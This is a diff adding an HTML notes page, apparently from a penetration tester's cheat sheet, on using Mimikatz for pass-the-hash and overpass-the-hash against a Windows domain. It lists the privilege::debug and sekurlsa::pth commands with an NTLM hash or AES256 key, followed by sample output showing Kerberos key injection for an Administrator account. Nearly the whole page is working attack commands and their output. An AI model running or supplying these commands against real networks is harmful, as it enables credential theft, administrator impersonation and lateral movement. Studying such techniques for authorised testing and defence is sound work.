@@ -1,0 +1,35 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>With Mimikatz</title>
+</head><body>Mimikatz pth (pass-the-hash)<br/>
+#privilege::debug<br/>
+#sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:&lt;hash&gt;<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+You can use nearly any key to obtain a TGT <br/>
+#privilege::debug<br/>
+#sekurlsa::pth /usr:Administrator /domain:domain.local /aes256<br/>
+mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local <b>/aes256:b7268361386090314acce8d9367e55f55865e7ef8e</b><br/>
+670fbe4262d6c94098a9e9<br/>
+user &nbsp; &nbsp;: Administrateur<br/>
+domain &nbsp;: chocolate.local<br/>
+program : cmd.exe<br/>
+AES256 &nbsp;: b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9<br/>
+&nbsp; | &nbsp;PID &nbsp;1652<br/>
+&nbsp; | &nbsp;TID &nbsp;548<br/>
+&nbsp; | &nbsp;LUID 0 ; 411133 (00000000:000645fd)<br/>
+&nbsp; \_ msv1_0 &nbsp; - data copy @ 0000000001675F70 : OK !<br/>
+&nbsp; \_ kerberos - data copy @ 000000000161E118<br/>
+<b>&nbsp; &nbsp;\_ aes256_hmac &nbsp; &nbsp; &nbsp; OK</b><br/>
+&nbsp; &nbsp;\_ aes128_hmac &nbsp; &nbsp; &nbsp; -&gt; null<br/>
+&nbsp; &nbsp;\_ rc4_hmac_nt &nbsp; &nbsp; &nbsp; -&gt; null<br/>
+&nbsp; &nbsp;\_ rc4_hmac_old &nbsp; &nbsp; &nbsp;-&gt; null<br/>
+&nbsp; &nbsp;\_ rc4_md4 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; -&gt; null<br/>
+&nbsp; &nbsp;\_ rc4_hmac_nt_exp &nbsp; -&gt; null<br/>
+&nbsp; &nbsp;\_ rc4_hmac_old_exp &nbsp;-&gt; null<br/>
+&nbsp; &nbsp;\_ *Password replace -&gt; null<br/>
+<br/>
+This time the NTLM protocol is NOT used, only Kerberos with AES256</body></html>
